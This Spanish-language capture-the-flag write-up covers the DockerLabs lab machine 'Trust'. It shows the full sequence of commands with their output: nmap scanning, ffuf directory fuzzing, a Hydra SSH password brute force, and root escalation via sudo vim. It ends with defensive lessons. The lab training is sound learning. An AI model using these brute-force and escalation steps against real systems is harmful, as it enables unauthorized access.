# 🖥️ Máquina: Trust

**Plataforma:** DockerLabs · **Dificultad:** Muy fácil · **SO:** Debian Linux · **IP:** `172.17.0.2`

---

## 🗺️ Flujo del ataque

```
Ping → Nmap → ffuf (secret.php) → Hydra (mario:chocolate) → SSH → sudo vim → ROOT
```

---

## 1️⃣ Reconocimiento

### Verificación de conectividad

```bash
ping 172.17.0.2
```

```
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.043 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.133 ms
```

TTL = 64 → Sistema Linux confirmado.

---

### Escaneo de puertos con Nmap

```bash
sudo nmap -p- -sS -sC --min-rate 5000 -n -vvv -Pn 172.17.0.2
```

| Puerto | Estado | Servicio |
|--------|--------|----------|
| 22/tcp | open | SSH |
| 80/tcp | open | HTTP (Apache2 Debian) |

---

## 2️⃣ Enumeración web

El puerto 80 muestra la página por defecto de Apache2. Se procede con fuzzing de directorios para encontrar rutas ocultas.

### Fuzzing con ffuf

```bash
ffuf -u http://172.17.0.2/FUZZ \
  -w ~/Desktop/Lists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt \
  -v -fs 10701 -r -e .php,.html
```

El flag `-fs 10701` filtra la página por defecto de Apache según su tamaño de respuesta.

**Resultado:**

```
[Status: 200, Size: 927]
  → http://172.17.0.2/secret.php
```

### Hallazgo en secret.php

La página muestra el mensaje:

> _"Hola Mario, esta web no se puede hackear."_

**Usuario identificado: `mario`**

---

## 3️⃣ Acceso inicial — Fuerza bruta SSH

Con el usuario `mario` y el puerto 22 abierto, se realiza un ataque de diccionario con Hydra usando `rockyou.txt`.

```bash
hydra -l mario \
  -P /home/Zer0th/Desktop/Lists/Rockyou/rockyou.txt \
  ssh://172.17.0.2 -v
```

**Resultado:**

```
[22][ssh] host: 172.17.0.2   login: mario   password: chocolate
```

### Conexión SSH

```bash
ssh mario@172.17.0.2
# Password: chocolate
```

```
Linux c528297bca0c 7.0.11-zen1-1-zen ...
mario@c528297bca0c:~$
```

---

## 4️⃣ Escalada de privilegios

### Enumeración de permisos sudo

```bash
sudo -l
```

```
User mario may run the following commands on c528297bca0c:
    (ALL) /usr/bin/vim
```

`vim` puede ejecutarse como root — vector de escalada confirmado.

### Explotación via vim shell

Referencia: [GTFOBins — vim](https://gtfobins.github.io/gtfobins/vim/)

```bash
sudo vim
```

Dentro de vim, en modo normal:

```vim
:shell
```

Esto abre una shell heredando los privilegios de `sudo`, otorgando acceso como root.

**Verificación:**

```bash
id
# uid=0(root) gid=0(root) groups=0(root)
whoami
# root
```

🏆 Acceso **root** obtenido.

---

## ✅ Resumen de credenciales

| Usuario | Contraseña | Método |
|---------|------------|--------|
| `mario` | `chocolate` | Hydra + rockyou.txt |
| `root` | — | `sudo vim` → `:shell` |

---

## 🔍 Lecciones aprendidas

- **Información de usuario expuesta en una página web** — `secret.php` reveló el nombre de usuario directamente, simplificando el ataque.
- **Contraseña débil en diccionario** — `chocolate` aparece en rockyou.txt, haciendo el ataque de fuerza bruta trivial.
- **`sudo NOPASSWD` sobre `vim`** — otorgar permisos sudo sobre cualquier editor de texto equivale a dar acceso root directo. Nunca se debe otorgar con `NOPASSWD`.

---

## 📚 Referencias

- [GTFOBins — vim](https://gtfobins.github.io/gtfobins/vim/)
- [SecLists](https://github.com/danielmiessler/SecLists)
- [THC Hydra](https://github.com/vanhauser-thc/thc-hydra)
- [DockerLabs](https://dockerlabs.es/)
